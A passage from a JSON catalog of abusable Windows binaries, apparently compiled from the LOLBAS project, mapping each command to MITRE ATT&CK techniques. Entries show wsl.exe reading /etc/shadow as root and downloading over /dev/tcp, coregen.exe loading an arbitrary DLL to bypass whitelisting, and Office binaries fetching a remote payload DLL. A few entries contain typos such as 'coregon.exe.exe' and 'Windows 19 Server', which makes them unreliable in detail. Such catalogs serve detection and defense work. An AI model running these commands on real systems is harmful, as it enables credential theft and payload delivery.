/mnt/c/Windows/System32/calc.exe", "Description": "Executes calc.exe from wsl.exe", "Usecase": "Performs execution of specified file, can be used to execute arbitrary Linux commands.", "Category": "Execute", "Privileges": "User", "MitreID": "T1202", "MitreLink": "https://attack.mitre.org/techniques/T1202", "OperatingSystem": "Windows 10, Windows 19 Server"}, {"Command": "wsl.exe -u root -e cat /etc/shadow", "Description": "Cats /etc/shadow file as root", "Usecase": "Performs execution of arbitrary Linux commands as root without need for password.", "Category": "Execute", "Privileges": "User", "MitreID": "T1202", "MitreLink": "https://attack.mitre.org/techniques/T1202", "OperatingSystem": "Windows 10, Windows 19 Server"}, {"Command": "wsl.exe --exec bash -c 'cat file'", "Description": "Cats /etc/shadow file as root", "Usecase": "Performs execution of arbitrary Linux commands.", "Category": "Execute", "Privileges": "User", "MitreID": "T1202", "MitreLink": "https://attack.mitre.org/techniques/T1202", "OperatingSystem": "Windows 10, Windows 19 Server"}]}, "1143": {"platform": "windows", "cmd": "Wsl.exe", "cmd_alias": "Wsl", "cmd_desc": "Windows subsystem for Linux executable", "function": "download", "data": [{"Command": "wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'", "Description": "Downloads file from 192.168.1.10", "Usecase": "Download file", "Category": "Download", "Privileges": "User", "MitreID": "T1202", "MitreLink": "https://attack.mitre.org/techniques/T1202", "OperatingSystem": "Windows 10, Windows 19 Server"}]}, "1144": {"platform": "windows", "cmd": "coregen.exe", "cmd_alias": "coregen", "cmd_desc": "Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.", "function": "execute", "data": [{"Command": "coregon.exe.exe /L C:\\folder\\evil.dll dummy_assembly_name", "Description": "Loads the target .DLL in arbitrary path specified with /L.", "Usecase": "Execute DLL code", "Category": "Execute", "Privileges": "User", "MitreID": "T1055", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1055", "OperatingSystem": "Windows"}, {"Command": "coregen.exe dummy_assembly_name", "Description": "Loads the coreclr.dll in the corgen.exe directory (e.g. C:\\Program Files\\Microsoft Silverlight\\5.1.50918.0).", "Usecase": "Execute DLL code", "Category": "Execute", "Privileges": "User", "MitreID": "T1055", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1055", "OperatingSystem": "Windows"}]}, "1145": {"platform": "windows", "cmd": "coregen.exe", "cmd_alias": "coregen", "cmd_desc": "Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.", "function": "awl-bypass", "data": [{"Command": "coregen.exe /L C:\\folder\\evil.dll dummy_assembly_name", "Description": "Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions.", "Usecase": "Execute DLL code", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1146": {"platform": "windows", "cmd": "Winword.exe", "cmd_alias": "Winword", "cmd_desc": "Microsoft Office binary", "function": "download", "data": [{"Command": "winword.exe \"http://192.168.1.10/TeamsAddinLoader.dll\"", "Description": "Downloads payload from remote server", "Usecase": "It will download a remote payload and place it in the cache folder", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows"}]}, "1147": {"platform": "windows", "cmd": "Excel.exe", "cmd_alias": "Excel", "cmd_desc": "Microsoft Office binary", "function": "download", "data": [{"Command": "Excel.exe http://192.168.1.10/TeamsAddinLoader.dll", "Description": "Downloads payload from remote server", "Usecase": "It will download a remote payload and place it in the cache folder", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows"}]}, "1148": {"platform": "windows", "cmd": "Devtoolslauncher.exe", "cmd_alias": "Devtoolslauncher", "cmd_desc": "Binary will execute specified binary. Part of VS/VScode installation.", "function": "execute", "data": [{"Command": "devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] \"argument here\" test", "Description": "The above binary will execute other binary.", "Usecase": "Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary. https://i.imgur.com/Go7rc0I.png", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with VS/VScode installed"}, {"Command": "devtoolslauncher.exe LaunchForDebug [PATH_TO_BIN] \"argument here\" test", "Description": "The above binary will execute other binary.", "Usecase": "Execute any binary with given arguments.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with VS/VScode installed"}]}}}